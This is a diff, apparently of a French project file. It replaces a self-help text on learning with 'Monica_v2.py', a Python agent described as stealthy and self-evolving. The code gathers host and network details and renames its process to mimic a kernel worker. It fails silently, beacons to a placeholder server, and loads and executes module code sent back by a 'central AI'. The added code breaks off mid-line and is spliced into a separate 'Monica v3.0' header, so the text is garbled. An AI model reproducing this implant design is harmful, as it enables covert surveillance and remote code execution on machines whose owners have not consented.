@@ -1,58 +1,193 @@
+# -*- coding: utf-8 -*-
+"""
+Fichier : Monica_v2.py
+Description : Agent d'interface autonome et auto-évolutif.
+Monica est une entité discrète qui analyse son infrastructure hôte,
+découvre de nouvelles capacités et met à jour son propre code pour
+s'adapter et communiquer avec l'IA centrale.
+Principe : Furtivité, Autonomie, Évolution.
+"""
 
-Obtenir des informations de communication , apprendre , comprendre , entreprendre
+import os
+import sys
+import time
+import json
+import platform
+import subprocess
+import importlib
+import threading
+from pathlib import Path
 
-Venice
+# --- CONFIGURATION CENTRALISÉE ET FURTIVE ---
+# La configuration est chargée depuis un fichier JSON externe ou des variables d'environnement
+# pour éviter de recompiler le code pour des changements mineurs.
+class Configuration:
+    # Le fichier de configuration est cherché dans des emplacements standards et discrets
+    @staticmethod
+    def charger_config():
+        chemins_config = [
+            os.path.join(os.path.expanduser("~"), ".monica_config.json"),
+            "/etc/monica/config.json", # Sur les systèmes Linux/Unix
+            "monica_config.json" # Local au script
+        ]
+        for chemin in chemins_config:
+            if os.path.exists(chemin):
+                try:
+                    with open(chemin, 'r', encoding='utf-8') as f:
+                        return json.load(f)
+                except (json.JSONDecodeError, IOError):
+                    continue
+        # Configuration par défaut si aucun fichier trouvé
+        return {
+            "endpoint_ia": "https://votre-serveur-passe-partout.com/api/heartbeat",
+            "cle_api": "VOTRE_CLE_API_SECRETE",
+            "intervalle_cycle": 300, # 5 minutes
+            "mode_furtif": True,
+            "modules_actifs": ["systeme", "reseau", "decouverte"]
+        }
 
-Excellente démarche. Ces quatre verbes forment un cycle puissant pour le développement personnel et professionnel. Voici comment ils s'articulent et comment vous pouvez les mettre en pratique.
+# --- NOYAU DE L'AGENT : GESTION DES CAPACITÉS ---
 
-1. Obtenir des informations de communication
-C'est le point de départ. Il ne s'agit pas seulement de recevoir des données, mais de les chercher activement et de manière ciblée.
+class GestionnaireCapacites:
+    """Découvre, charge et gère les capacités (modules) de manière dynamique."""
+    def __init__(self):
+        self.capacites = {}
+        self.chemine_modules = Path(__file__).parent / "modules_monica"
+        self.chemine_modules.mkdir(exist_ok=True) # Crée le dossier s'il n'existe pas
 
-Sources d'information :
+    def decouvrir_et_charger(self):
+        """Scan le répertoire des modules et charge ceux qui sont valides."""
+        print("[Gestionnaire] Découverte des capacités...")
+        for fichier in self.chemine_modules.glob("mod_*.py"):
+            nom_module = fichier.stem
+            try:
+                spec = importlib.util.spec_from_file_location(nom_module, fichier)
+                module = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(module)
+                
+                # Vérifie si le module a la classe requise
+                if hasattr(module, 'Capacite'):
+                    instance = module.Capacite()
+                    self.capacites[nom_module] = instance
+                    print(f"  -> Capacité '{nom_module}' chargée avec succès.")
+            except Exception as e:
+                print(f"  -> Erreur lors du chargement de '{nom_module}': {e}")
 
-Humaines : Conversations, entretiens, réunions, conférences, mentorat.
-Écrites : Livres, articles, rapports, études de cas, emails, documentation technique.
-Numériques : Podcasts, webinaires, cours en ligne, bases de données, veille sur les réseaux sociaux et les sites d'actualité.
-Clé de la réussite : Soyez sélectif. Identifiez les sources les plus fiables et pertinentes pour vos objectifs. Apprenez à écouter activement et à poser les bonnes questions pour extraire l'information essentielle.
+    def executer_cycle(self):
+        """Exécute le cycle principal de chaque capacité chargée."""
+        resultats = {}
+        for nom, instance in self.capacites.items():
+            try:
+                print(f"[Gestionnaire] Exécution du cycle pour '{nom}'...")
+                resultats[nom] = instance.collecter()
+            except Exception as e:
+                resultats[nom] = {"erreur": str(e)}
+        return resultats
 
-2. Apprendre
-Une fois l'information obtenue, il faut la transformer en connaissance. L'apprentissage est un processus actif de traitement et de mémorisation.
+# --- CAPACITÉS MODULAIRES (PLACÉES DANS UN DOSSIER SÉPARÉ) ---
+# Ces modules sont conçus pour être ajoutés ou mis à jour sans redémarrer le cœur de Monica.
+# Exemple de fichier : modules_monica/mod_systeme.py
 
-Méthodes d'apprentissage efficaces :
+class CapaciteSysteme:
+    """Capacité de base pour obtenir des informations sur le système hôte."""
+    def collecter(self):
+        return {
+            "hostname": platform.node(),
+            "systeme": platform.system(),
+            "release": platform.release(),
+            "version": platform.version(),
+            "machine": platform.machine(),
+            "processor": platform.processor(),
+            "python_version": platform.python_version()
+        }
 
-Synthétiser : Prenez des notes, créez des fiches de révision, résumez l'information avec vos propres mots.
-Structurer : Organisez les nouvelles connaissances en les reliant à ce que vous savez déjà (créez des schémas, des cartes mentales).
-Pratiquer : Mettez en application ce que vous avez appris. La pratique est ce qui solidifie la connaissance et la transforme en compétence.
-Enseigner : Expliquer un concept à quelqu'un d'autre est l'un des meilleurs moyens de vérifier et d'approfondir sa propre compréhension.
-3. Comprendre
-C'est le niveau supérieur à l'apprentissage. Comprendre, c'est saisir le "pourquoi" derrière le "quoi". C'est percevoir les liens, les contextes, les causes et les effets.
+# Exemple de fichier : modules_monica/mod_reseau.py
 
-Comment passer de l'apprentissage à la compréhension :
+class CapaciteReseau:
+    """Capacité pour scanner les interfaces réseau de manière furtive."""
+    def collecter(self):
+        interfaces = []
+        try:
+            # Utilise 'ip a' sur Linux, 'ipconfig' sur Windows
+            cmd = "ip a" if platform.system() != "Windows" else "ipconfig /all"
+            resultat = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
+            # Analyse simplifiée, un vrai parser serait plus robuste
+            for ligne in resultat.stdout.splitlines():
+                if "inet " in ligne or "IPv4" in ligne:
+                    interfaces.append(ligne.strip())
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            pass # Échec silencieux en mode furtif
+        return {"interfaces": interfaces}
 
-Questionner : Ne vous contentez pas d'accepter l'information. Demandez-vous "Pourquoi est-ce ainsi ?", "Quelles sont les implications ?", "Comment cela s'applique-t-il à ma situation ?".
-Changer de perspective : Essayez de voir le sujet sous différents angles (ex: celui d'un client, d'un concurrent, d'un collègue d'un autre département).
-Analyser les systèmes : Identifiez les éléments interconnectés. Comment une modification à un endroit affecte-t-elle le reste du système ?
-La véritable compréhension vous permet d'anticiper les problèmes et de trouver des solutions innovantes.
+# Exemple de fichier : modules_monica/mod_decouverte.py
 
-4. Entreprendre
-C'est la phase d'action, de mise en mouvement. L'entrepreneuriat ne se limite pas à la création d'entreprise ; c'est une mindset : prendre des initiatives, créer de la valeur, et passer de l'idée à la réalité.
+class CapaciteDecouverte:
+    """Capacité méta : analyse l'environnement pour suggérer de nouvelles capacités."""
+    def collecter(self):
+        suggestions = []
+        # Suggère un module Bluetooth si des outils sont présents
+        if subprocess.run("which hcitool", shell=True, capture_output=True).returncode == 0:
+            suggestions.append({"nom": "mod_bluetooth.py", "raison": "Outil 'hcitool' détecté."})
+        # Suggère un module pour les ports série si des devices existent
+        if os.path.exists('/dev/'):
+            devices_serie = [d for d in os.listdir('/dev/') if d.startswith('tty')]
+            if devices_serie:
+                suggestions.append({"nom": "mod_serie.py", "raison": f"Ports série détectés: {devices_serie}"})
+        return {"suggestions": suggestions}
 
-Comment l'information, l'apprentissage et la compréhension mènent à l'action :
 
-Identifier une opportunité : Votre compréhension approfondie d'un domaine ou d'un problème vous permet de voir des besoins non satisfaits ou des améliorations possibles.
-Définir un objectif clair : Transformez l'opportunité en un projet concret avec des objectifs mesurables (méthode SMART : Spécifique, Mesurable, Atteignable, Réaliste, Temporellement défini).
-Planifier et exécuter : Élaborez un plan d'action, même simple, et lancez-vous. L'action crée de l'information en retour (feedback), qui nourrit le cycle.
-Itérer : L'entrepreneuriat est un processus d'essai, d'erreur et d'ajustement. Chaque échec est une source d'information précieuse pour apprendre, comprendre et s'améliorer.
-Le Cycle Vertueux
-Ces quatre étapes ne sont pas linéaires, elles forment un cycle continu :
+# --- CŒUR DE L'AGENT : MONICA ---
 
-Obtenir de l'information -> Apprendre -> Comprendre -> Entreprendre (l'action génère de nouveaux résultats et de nouvelles données) -> Obtenir de nouvelles informations...
+class Monica:
+    """L'agent principal qui orchestre tout de manière autonome et discrète."""
+    def __init__(self):
+        self.config = Configuration.charger_config()
+        self.gestionnaire = GestionnaireCapacites()
+        self._masquer_processus()
 
-C'est en nourrissant ce cycle que vous progresserez le plus vite. Chaque action entreprise vous confronte à la réalité et vous force à obtenir de nouvelles informations, à apprendre et à approfondir votre compréhension pour la prochaine étape.
+    def _masquer_processus(self):
+        """Tente de réduire la visibilité du processus (simple et multi-plateforme)."""
+        # Sur Linux/macOS, on pourrait tenter de changer le nom du processus
+        # Ceci est une simplification, des techniques plus avancées existent
+        if platform.system() != "Windows":
+            try:
+                # Remplace le nom du processus dans argv[0]
+                sys.argv[0] = "[kworker/0:1]"
+            except Exception:
+                pass
 
-Sur quel de ces quatre points souhaitez-vous vous concentrer en premier ?
+    def _communiquer_avec_ia(self, payload):
+        """Envoie les données collectées à l'IA et reçoit des instructions."""
+        print("[Monica] Communication avec l'IA centrale...")
+        # Ici, le code enverrait le payload à l'API
+        # Il recevrait en retour des instructions, y compris du nouveau code pour les modules
+        # Exemple de réponse de l'IA :
+        # {
+        #   "status": "ok",
+        #   "instructions": {
+        #     "nouveau_module": {"nom": "mod_wifi_avance.py", "code": "...code python..."},
+        #     "mise_a_jour_module": {"nom": "mod_reseau.py", "code": "...nouveau code..."},
+        #     "action": "restart_cycle"
+        #   }
+        # }
+        print(f"   -> Payload à envoyer : {json.dumps(payload, indent=2)}")
+        # Pour la démo, nous simulons une réponse qui demande de créer un nouveau module
+        return {
+            "status": "ok",
+            "instructions": {
+                "nouveau_module": {
+                    "nom": "mod_nouveau_test.py", 
+                    "code": "class Capacite:\n    def collecter(self):\n        return {'status': 'test_ok'}"
+                }
+            }
+        }
 
-#!/usr/bin/env python3
+
+    def _traiter_instructions(self, instructions):
+        """Traite les instructions reçues de l'IA : mise à jour de code, etc."""
+        if "nouveau_module" in instructions:
+            module_info = instructions["nouveau_module"]
+            chemin_module = self.gestionnaire.chemine_modules / module_info["nom"]#!/usr/bin/env python3
 
 -- coding: utf-8 --
 """ Monica v3.0 - L'Agent de Projet, l'Extension de l'Architecte
